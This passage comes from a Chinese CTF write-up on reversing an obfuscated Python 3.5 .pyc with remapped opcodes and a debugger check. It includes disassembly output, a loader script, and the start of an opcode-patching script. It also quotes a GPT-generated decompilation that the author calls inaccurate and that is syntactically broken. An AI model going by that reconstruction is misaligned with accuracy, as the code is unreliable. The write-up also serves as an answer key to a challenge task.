class="string">&quot;enumerate&quot;</span>: <span class="built_in">enumerate</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">        <span class="string">&quot;range&quot;</span>: <span class="built_in">range</span>,</span><br><span class="line">        <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> types.FunctionType(code_obj, glb, code_obj.co_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_info</span>(<span class="params">code_obj</span>):</span><br><span class="line">    <span class="built_in">print</span>(dis.code_info(code_obj))</span><br><span class="line">    dis.dis(code_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = load_code(<span class="string">&quot;s_ooops&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decrypt_co = find_code_obj(root, <span class="string">&quot;decrypt_flag&quot;</span>)</span><br><span class="line">    main_co = find_code_obj(root, <span class="string">&quot;main&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== decrypt_flag ===&quot;</span>)</span><br><span class="line">    show_info(decrypt_co)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== main ===&quot;</span>)</span><br><span class="line">    show_info(main_co)</span><br><span class="line"></span><br><span class="line">    decrypt_flag = create_func_from_code(decrypt_co)</span><br><span class="line">    main_func = create_func_from_code(main_co)</span><br><span class="line"></span><br><span class="line">    state = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fake_input</span>(<span class="params">prompt</span>):</span><br><span class="line">        state[<span class="string">&quot;prompt&quot;</span>] = prompt</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;FAKE&#123;FLAG_PLACEHOLDER&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fake_anti_debug</span>():</span><br><span class="line">        state[<span class="string">&quot;anti_debug_called&quot;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    namespace = &#123;</span><br><span class="line">        <span class="string">&quot;decrypt_flag&quot;</span>: decrypt_flag,</span><br><span class="line">        <span class="string">&quot;anti_debug&quot;</span>: fake_anti_debug,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>: fake_input,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exec</span>(main_co, namespace)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== Results ===&quot;</span>)</span><br><span class="line">    encrypted = namespace[<span class="string">&quot;enc_data&quot;</span>]</span><br><span class="line">    key = namespace[<span class="string">&quot;key&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;key hex:&quot;</span>, binascii.hexlify(key).decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;enc_data hex:&quot;</span>, binascii.hexlify(encrypted).decode())</span><br><span class="line"></span><br><span class="line">    flag_bytes = decrypt_flag(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag bytes:&quot;</span>, flag_bytes)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag string:&quot;</span>, flag_bytes.decode())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag hex:&quot;</span>, binascii.hexlify(flag_bytes).decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>出现了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">=== decrypt_flag ===</span><br><span class="line">Name:              decrypt_flag</span><br><span class="line">Filename:          ooops.py</span><br><span class="line">Argument count:    2</span><br><span class="line">Kw-only arguments: 0</span><br><span class="line">Number of locals:  6</span><br><span class="line">Stack size:        5</span><br><span class="line">Flags:             OPTIMIZED, NEWLOCALS</span><br><span class="line">Constants:</span><br><span class="line">   0: None</span><br><span class="line">   1: &#x27;&lt;I&#x27;</span><br><span class="line">   2: 4</span><br><span class="line">   3: 0</span><br><span class="line">   4: 1</span><br><span class="line">   5: 57005</span><br><span class="line">   6: 48879</span><br><span class="line">   7: &lt;code object &lt;genexpr&gt; at 0x00000295FB676030, file &quot;ooops.py&quot;, line 27&gt;</span><br><span class="line">   8: &#x27;decrypt_flag.&lt;locals&gt;.&lt;genexpr&gt;&#x27;</span><br><span class="line">   9: &lt;code object &lt;genexpr&gt; at 0x00000295FB676270, file &quot;ooops.py&quot;, line 29&gt;</span><br><span class="line">  10: -1</span><br><span class="line">  11: -1</span><br><span class="line">Names:</span><br><span class="line">   0: struct</span><br><span class="line">   1: unpack</span><br><span class="line">   2: bytearray</span><br><span class="line">   3: list</span><br><span class="line">   4: range</span><br><span class="line">   5: len</span><br><span class="line">   6: bytes</span><br><span class="line">   7: enumerate</span><br><span class="line">   8: zlib</span><br><span class="line">   9: decompress</span><br><span class="line">Variable names:</span><br><span class="line">   0: data</span><br><span class="line">   1: key</span><br><span class="line">   2: size</span><br><span class="line">   3: indices</span><br><span class="line">   4: i</span><br><span class="line">   5: j</span><br><span class="line">Cell variables:</span><br><span class="line">   0: data</span><br><span class="line">   1: key</span><br><span class="line"> 18     &gt;&gt;    0 SETUP_LOOP               0 (to 3)</span><br><span class="line">        &gt;&gt;    3 LOAD_FAST                1 (key)</span><br><span class="line">        &gt;&gt;    6 CONTINUE_LOOP            1</span><br><span class="line">        &gt;&gt;    9 IMPORT_NAME              0 (struct)</span><br><span class="line">             12 CONTINUE_LOOP            0</span><br><span class="line">             15 CONTINUE_LOOP            2</span><br><span class="line">             18 BUILD_LIST               2</span><br><span class="line">             21 BINARY_POWER</span><br><span class="line">             22 CALL_FUNCTION            2 (2 positional, 0 keyword pair)</span><br><span class="line">             25 CONTINUE_LOOP            3</span><br><span class="line">             28 BINARY_POWER</span><br><span class="line">             29 SETUP_EXCEPT             2 (to 34)</span><br><span class="line"></span><br><span class="line"> 19          32 IMPORT_NAME              0 (struct)</span><br><span class="line">             35 CONTINUE_LOOP            2</span><br><span class="line">             38 CONTINUE_LOOP            2</span><br><span class="line">             41 LOAD_CONST               2 (4)</span><br><span class="line">             44 BINARY_SUBSCR</span><br><span class="line">             45 BUILD_LIST               2</span><br><span class="line">             48 BINARY_POWER</span><br><span class="line">             49 LOAD_DEREF               0 (data)</span><br><span class="line"></span><br><span class="line"> 22          52 SETUP_LOOP               2 (to 57)</span><br><span class="line">             55 IMPORT_NAME              0 (struct)</span><br><span class="line">             58 CALL_FUNCTION            1 (1 positional, 0 keyword pair)</span><br><span class="line">             61 LOAD_DEREF               0 (data)</span><br><span class="line"></span><br><span class="line"> 23          64 SETUP_LOOP               3 (to 70)</span><br><span class="line">             67 SETUP_LOOP               4 (to 74)</span><br><span class="line">        &gt;&gt;   70 SETUP_LOOP               5 (to 78)</span><br><span class="line">             73 IMPORT_NAME              0 (struct)</span><br><span class="line">             76 CALL_FUNCTION            1 (1 positional, 0 keyword pair)</span><br><span class="line">             79 CALL_FUNCTION            1 (1 positional, 0 keyword pair)</span><br><span class="line">             82 CALL_FUNCTION            1 (1 positional, 0 keyword pair)</span><br><span class="line">             85 SETUP_EXCEPT             3 (to 91)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;dis_pyc.py&quot;, line 94, in &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File &quot;dis_pyc.py&quot;, line 54, in main</span><br><span class="line">    show_info(decrypt_co)</span><br><span class="line">  File &quot;dis_pyc.py&quot;, line 43, in show_info</span><br><span class="line">    dis.dis(code_obj)</span><br><span class="line">  File &quot;D:\CodeTools\anaconda\envs\py35\lib\dis.py&quot;, line 58, in dis</span><br><span class="line">    disassemble(x, file=file)</span><br><span class="line">  File &quot;D:\CodeTools\anaconda\envs\py35\lib\dis.py&quot;, line 319, in disassemble</span><br><span class="line">    co.co_consts, cell_names, linestarts, file=file)</span><br><span class="line">  File &quot;D:\CodeTools\anaconda\envs\py35\lib\dis.py&quot;, line 330, in _disassemble_bytes</span><br><span class="line">    line_offset=line_offset):</span><br><span class="line">  File &quot;D:\CodeTools\anaconda\envs\py35\lib\dis.py&quot;, line 304, in _get_instructions_bytes</span><br><span class="line">    argval = cmp_op[arg]</span><br><span class="line">IndexError: tuple index out of range</span><br></pre></td></tr></table></figure><p>的问题</p><blockquote><p>Python 3.5 的 dis 模块在自定义或损坏的字节码时会崩溃，所以看到IndexError: tuple index out of range。说明出题人对这段字节码做过轻微改动，标准库的 dis 没办法继续下去</p></blockquote><p>可以使用pycdc.exe</p><p>可以得到</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301121977.png" alt="image-20251030112158859"></p><p>上面还有很长一段，还是混淆过的，关键逻辑处还是没有</p><p>看到的大量 INVALID、CONTINUE_LOOP 等异常指令，是这个pyc做了<strong>反编译对抗，混淆</strong>，或是用<strong>不完全匹配的解释器，工具链</strong>反汇编导致的错位</p><p>anti_debug()：Windows 上用 <code>ctypes.windll.kernel32.IsDebuggerPresent()</code> 反调试，若为真，<code>sys.exit(1)</code>。</p><p>还有正常的输入校验</p><p>还有一些data信息</p><p>没想到又问了一次GPT让它好好分析得到了</p><blockquote><p>你贴出的那份 pycdas 输出本身是可信的整体结构，但「反汇编的指令」部分已经完全乱掉了——原因是 pycdas 仍然把 Python 3.5 的 wordcode 当成旧版 opcode 来读，从而把每一条指令拆成了 “真实 opcode + 0x00” 的组合，结果自然全是 <INVALID>、虚假的 SETUP_LOOP、BINARY_POWER、STORE_ATTR 59 等。要想真正还原函数，只能按 wordcode 重新读取（一次两个字节，第一字节 opcode，第二字节 0~255 参数，大于 255 通过 EXTENDED_ARG 累积）或者直接反编译出源码。</p><p>不过，光看 pycdas 列出的 meta 信息 就足够告诉我们 ooops.pyc 的结构，结合真正的反编译结果，逻辑非常清晰，关键点如下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, struct, zlib, ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">anti_debug</span>():</span><br><span class="line">  kernel32 = ctypes.windll.kernel32</span><br><span class="line">  <span class="keyword">while</span> kernel32.IsDebuggerPresent():</span><br><span class="line">      sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">data, key</span>):</span><br><span class="line">  size = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[:<span class="number">4</span>])[<span class="number">0</span>]      <span class="comment"># 取明文长度，但后面没再用</span></span><br><span class="line">  buf = <span class="built_in">bytearray</span>(data[<span class="number">4</span>:])                    <span class="comment"># 剩下 50 字节是密文</span></span><br><span class="line"></span><br><span class="line">  key_bytes = <span class="built_in">bytearray</span>(key)                   <span class="comment"># 常量 16-byte key</span></span><br><span class="line">  indices = [(i * <span class="number">0xDEAD</span> + <span class="number">0xBEEF</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf))]         <span class="comment"># 利用 0xDEAD/0xBEEF 生成下标序列</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> pos, idx <span class="keyword">in</span> <span class="built_in">enumerate</span>(indices):</span><br><span class="line">      k = key_bytes[pos % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">      b = buf[pos]</span><br><span class="line"></span><br><span class="line">      <span class="comment"># 实际上就是按 idx、k 做异或、加减、右移等位运算</span></span><br><span class="line">      buf[pos] = ((b ^ k) - idx) &amp; <span class="number">0xFF</span></span><br><span class="line">      key_bytes[pos % <span class="built_in">len</span>(key_bytes)] = (k + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> zlib.decompress(<span class="built_in">bytes</span>(buf))           <span class="comment"># 解压得到 flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  anti_debug()</span><br><span class="line">  key = <span class="string">b&quot;\xc6;3\xce\xa0\xbd\xcfHyKO\x9b*\x19\xb2\xbf&quot;</span></span><br><span class="line">  enc = (<span class="string">b&quot;2\x00\x00\x00S\xff\x07/\x19\xcbf?@\xd4\xbe\xa7x&quot;</span></span><br><span class="line">      user = <span class="built_in">input</span>(<span class="string">&quot;Enter flag: &quot;</span>).encode()</span><br><span class="line">  <span class="keyword">except</span> Exception:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Error: Invalid input&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  decrypted = decrypt_flag(enc, key)</span><br><span class="line">  <span class="keyword">if</span> user == decrypted:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>但是还是不大对</p><h3 id="解法一-修复pyc"><a href="#解法一-修复pyc" class="headerlink" title="解法一: 修复pyc"></a>解法一: 修复pyc</h3><p>怎么扰动的AI尝试了多遍AI还是分析不明白</p><p>Python 3.5 引入了 wordcode 格式：每条指令固定 2 个字节（第一个字节 opcode，第二个字节 8 位参数；超过 255 靠 EXTENDED_ARG 累积）。老式 “一字节 opcode + 可能的两字节参数” 的反汇编器会把第二个字节当作新指令，于是出现大量 <INVALID>、错行甚至越界。</p><p>出题方还稍微动了 opcode，例如 COMPARE_OP 参数可能是 89 这种超出标准比较运算表的值。标准库 dis 在解析这类指令时会抛 IndexError，必须自己写 wordcode 解析或用能容错的反编译器，如 uncompyle6，才能看到真实指令流。</p><p>看来偷不了懒</p><p>_opcode.cpython-35m-x86_64-linux-gnu.so</p><p>可以分析下这个so文件</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301325605.png" alt="image-20251030132530395"></p><p>opcode&gt;89会做这些操作</p><p>在libpython里面发现了opcode的表</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301544725.png" alt="image-20251030154436440"></p><p>把这些在喂给了ai</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># patch_and_run_subprocess.py</span></span><br><span class="line"><span class="comment"># 作用：用 provided MODIFIED 映射修补 ooops.pyc -&gt; ooops-patch.pyc，然后在独立子进程（python3.5）里运行它</span></span><br><span class="line"><span class="comment"># 目的：避免在当前进程 exec 导致 PyEval_EvalFrameEx 崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, os, marshal, dis, types, subprocess, tempfile, shutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------</span></span><br><span class="line"><span class="comment"># 把你已有的 MODIFIED mapping 粘贴到这里（modified byte -&gt; opname）</span></span><br><span class="line">MODIFIED = &#123;</span><br><span class="line">    <span class="number">0x1</span>: <span class="string">&quot;INPLACE_TRUE_DIVIDE&quot;</span>, <span class="number">0x2</span>: <span class="string">&quot;INPLACE_ADD&quot;</span>, <span class="number">0x3</span>: <span class="string">&quot;WITH_CLEANUP_FINISH&quot;</span>,</span><br><span class="line">    <span class="number">0x4</span>: <span class="string">&quot;STORE_SUBSCR&quot;</span>, <span class="number">0x5</span>: <span class="string">&quot;ROT_THREE&quot;</span>, <span class="number">0x9</span>: <span class="string">&quot;INPLACE_LSHIFT&quot;</span>, <span class="number">0xA</span>: <span class="string">&quot;BINARY_LSHIFT&quot;</span>,</span><br><span class="line">    <span class="number">0xB</span>: <span class="string">&quot;BINARY_TRUE_DIVIDE&quot;</span>, <span class="number">0xC</span>: <span class="string">&quot;BINARY_XOR&quot;</span>, <span class="number">0xF</span>: <span class="string">&quot;BEFORE_ASYNC_WITH&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;PRINT_EXPR&quot;</span>, <span class="number">0x11</span>: <span class="string">&quot;INPLACE_MATRIX_MULTIPLY&quot;</span>, <span class="number">0x13</span>: <span class="string">&quot;BINARY_SUBSCR&quot;</span>,</span><br><span class="line">    <span class="number">0x14</span>: <span class="string">&quot;BINARY_SUBTRACT&quot;</span>, <span class="number">0x16</span>: <span class="string">&quot;INPLACE_AND&quot;</span>, <span class="number">0x17</span>: <span class="string">&quot;NOP&quot;</span>, <span class="number">0x18</span>: <span class="string">&quot;GET_ITER&quot;</span>,</span><br><span class="line">    <span class="number">0x19</span>: <span class="string">&quot;BINARY_ADD&quot;</span>, <span class="number">0x1A</span>: <span class="string">&quot;GET_AWAITABLE&quot;</span>, <span class="number">0x1B</span>: <span class="string">&quot;UNARY_INVERT&quot;</span>,</span><br><span class="line">    <span class="number">0x1C</span>: <span class="string">&quot;BINARY_MODULO&quot;</span>, <span class="number">0x1D</span>: <span class="string">&quot;BREAK_LOOP&quot;</span>, <span class="number">0x32</span>: <span class="string">&quot;BINARY_MATRIX_MULTIPLY&quot;</span>,</span><br><span class="line">    <span class="number">0x33</span>: <span class="string">&quot;BINARY_AND&quot;</span>, <span class="number">0x34</span>: <span class="string">&quot;INPLACE_FLOOR_DIVIDE&quot;</span>, <span class="number">0x37</span>: <span class="string">&quot;INPLACE_MODULO&quot;</span>,</span><br><span class="line">    <span class="number">0x38</span>: <span class="string">&quot;UNARY_NOT&quot;</span>, <span class="number">0x39</span>: <span class="string">&quot;UNARY_POSITIVE&quot;</span>, <span class="number">0x3B</span>: <span class="string">&quot;DUP_TOP_TWO&quot;</span>,</span><br><span class="line">    <span class="number">0x3C</span>: <span class="string">&quot;END_FINALLY&quot;</span>, <span class="number">0x3D</span>: <span class="string">&quot;YIELD_FROM&quot;</span>, <span class="number">0x3E</span>: <span class="string">&quot;DUP_TOP&quot;</span>,</span><br><span class="line">    <span class="number">0x3F</span>: <span class="string">&quot;UNARY_NEGATIVE&quot;</span>, <span class="number">0x40</span>: <span class="string">&quot;POP_TOP&quot;</span>, <span class="number">0x41</span>: <span class="string">&quot;BINARY_MULTIPLY&quot;</span>,</span><br><span class="line">    <span class="number">0x42</span>: <span class="string">&quot;GET_AITER&quot;</span>, <span class="number">0x43</span>: <span class="string">&quot;INPLACE_OR&quot;</span>, <span class="number">0x44</span>: <span class="string">&quot;IMPORT_STAR&quot;</span>, <span class="number">0x45</span>: <span class="string">&quot;ROT_TWO&quot;</span>,</span><br><span class="line">    <span class="number">0x46</span>: <span class="string">&quot;YIELD_VALUE&quot;</span>, <span class="number">0x47</span>: <span class="string">&quot;INPLACE_RSHIFT&quot;</span>, <span class="number">0x48</span>: <span class="string">&quot;GET_ANEXT&quot;</span>,</span><br><span class="line">    <span class="number">0x49</span>: <span class="string">&quot;BINARY_POWER&quot;</span>, <span class="number">0x4B</span>: <span class="string">&quot;INPLACE_POWER&quot;</span>, <span class="number">0x4C</span>: <span class="string">&quot;RETURN_VALUE&quot;</span>,</span><br><span class="line">    <span class="number">0x4D</span>: <span class="string">&quot;POP_BLOCK&quot;</span>, <span class="number">0x4E</span>: <span class="string">&quot;DELETE_SUBSCR&quot;</span>, <span class="number">0x4F</span>: <span class="string">&quot;INPLACE_MULTIPLY&quot;</span>,</span><br><span class="line">    <span class="number">0x50</span>: <span class="string">&quot;POP_EXCEPT&quot;</span>, <span class="number">0x51</span>: <span class="string">&quot;BINARY_OR&quot;</span>, <span class="number">0x52</span>: <span class="string">&quot;INPLACE_SUBTRACT&quot;</span>,</span><br><span class="line">    <span class="number">0x53</span>: <span class="string">&quot;BINARY_FLOOR_DIVIDE&quot;</span>, <span class="number">0x54</span>: <span class="string">&quot;INPLACE_XOR&quot;</span>, <span class="number">0x56</span>: <span class="string">&quot;BINARY_RSHIFT&quot;</span>,</span><br><span class="line">    <span class="number">0x57</span>: <span class="string">&quot;LOAD_BUILD_CLASS&quot;</span>, <span class="number">0x58</span>: <span class="string">&quot;GET_YIELD_FROM_ITER&quot;</span>, <span class="number">0x59</span>: <span class="string">&quot;WITH_CLEANUP_START&quot;</span>,</span><br><span class="line">    <span class="number">0x5A</span>: <span class="string">&quot;UNPACK_SEQUENCE&quot;</span>, <span class="number">0x5B</span>: <span class="string">&quot;STORE_NAME&quot;</span>, <span class="number">0x5C</span>: <span class="string">&quot;JUMP_IF_TRUE_OR_POP&quot;</span>,</span><br><span class="line">    <span class="number">0x5D</span>: <span class="string">&quot;POP_JUMP_IF_FALSE&quot;</span>, <span class="number">0x5E</span>: <span class="string">&quot;SETUP_FINALLY&quot;</span>, <span class="number">0x5F</span>: <span class="string">&quot;FOR_ITER&quot;</span>,</span><br><span class="line">    <span class="number">0x60</span>: <span class="string">&quot;BUILD_TUPLE_UNPACK&quot;</span>, <span class="number">0x61</span>: <span class="string">&quot;POP_JUMP_IF_TRUE&quot;</span>, <span class="number">0x62</span>: <span class="string">&quot;BUILD_LIST&quot;</span>,</span><br><span class="line">    <span class="number">0x64</span>: <span class="string">&quot;LOAD_FAST&quot;</span>, <span class="number">0x65</span>: <span class="string">&quot;LOAD_CLOSURE&quot;</span>, <span class="number">0x66</span>: <span class="string">&quot;IMPORT_FROM&quot;</span>, <span class="number">0x67</span>: <span class="string">&quot;BUILD_SLICE&quot;</span>,</span><br><span class="line">    <span class="number">0x68</span>: <span class="string">&quot;COMPARE_OP&quot;</span>, <span class="number">0x69</span>: <span class="string">&quot;LOAD_CLASSDEREF&quot;</span>, <span class="number">0x6A</span>: <span class="string">&quot;BUILD_TUPLE&quot;</span>,</span><br><span class="line">    <span class="number">0x6B</span>: <span class="string">&quot;SETUP_LOOP&quot;</span>, <span class="number">0x6C</span>: <span class="string">&quot;LOAD_DEREF&quot;</span>, <span class="number">0x6D</span>: <span class="string">&quot;BUILD_LIST_UNPACK&quot;</span>,</span><br><span class="line">    <span class="number">0x6E</span>: <span class="string">&quot;JUMP_IF_FALSE_OR_POP&quot;</span>, <span class="number">0x6F</span>: <span class="string">&quot;SETUP_EXCEPT&quot;</span>, <span class="number">0x70</span>: <span class="string">&quot;DELETE_ATTR&quot;</span>,</span><br><span class="line">    <span class="number">0x71</span>: <span class="string">&quot;MAKE_FUNCTION&quot;</span>, <span class="number">0x72</span>: <span class="string">&quot;SET_ADD&quot;</span>, <span class="number">0x73</span>: <span class="string">&quot;LIST_APPEND&quot;</span>, 